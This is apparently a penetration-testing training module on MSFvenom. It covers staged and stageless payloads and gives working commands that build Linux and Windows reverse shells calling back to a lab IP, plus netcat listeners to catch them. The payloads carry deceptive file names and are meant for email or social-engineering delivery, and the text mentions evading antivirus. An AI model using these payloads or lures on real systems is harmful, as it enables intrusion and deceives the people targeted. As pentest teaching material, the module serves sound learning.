This may have been possible through having a presence on the internal network or a network that has routes into the network where the target resides. There will be situations where we do not have direct network access to a vulnerable target machine. In these cases, we will need to get crafty in how the payload gets delivered and executed on the system. One such way may be to use `MSFvenom` to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.

In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures.

## Practicing with MSFvenom

we can issue the command `msfvenom -l payloads` to list all the available payloads.
#### List Payloads

	AstraX01@htb[/htb]$ msfvenom -l payloads

`What do you notice about the output?`

We can see a few details that will help us understand payloads further. First of all, we can see that the payload naming convention almost always starts by listing the OS of the target (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). We can also see that some payloads are described as (`staged`) or (`stageless`). Let's cover the difference.

## Staged vs. Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload.


---
`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload.

Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The `name` will give you your first marker. Take our examples from above, `linux/x86/shell/reverse_tcp` is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So `/shell/` is a stage to send, and `/reverse_tcp` is another. This will look like it is all pressed together for a stageless payload. Take our example `linux/zarch/meterpreter_reverse_tcp`. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function `/meterpreter_reverse_tcp`.


## Building A Stageless Payload

Now let's build a simple stageless payload with msfvenom and break down the command.

#### Build It

	AstraX01@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

#### Call MSFvenom

	msfvenom

Defines the tool used to make the payload.

#### Creating a Payload

	-p 

This `option` indicates that msfvenom is creating a payload.

#### Choosing the Payload based on Architecture

	linux/x64/shell_reverse_tcp

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

#### Address To Connect Back To

	LHOST=10.10.14.113 LPORT=443

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

#### Format To Generate Payload In

	-f elf

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output

	> createbackup.elf

## Executing a Stageless Payload

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

We would have a listener ready to catch the connection on the attack box side upon successful execution.

#### NC Connection

	AstraX01@htb[/htb]$ sudo nc -lvnp 443

When the file is executed, we see that we have caught a shell.

#### Connection Established

	AstraX01@htb[/htb]$ sudo nc -lvnp 443

This same concept can be used to create payloads for various platforms, including Windows.

---

## Building a simple Stageless Payload for a Windows system

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.

#### Windows Payload

	AstraX01@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.

---

## Executing a Simple Stageless Payload On a Windows System

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

	AstraX01@htb[/htb]$ sudo nc -lvnp 443



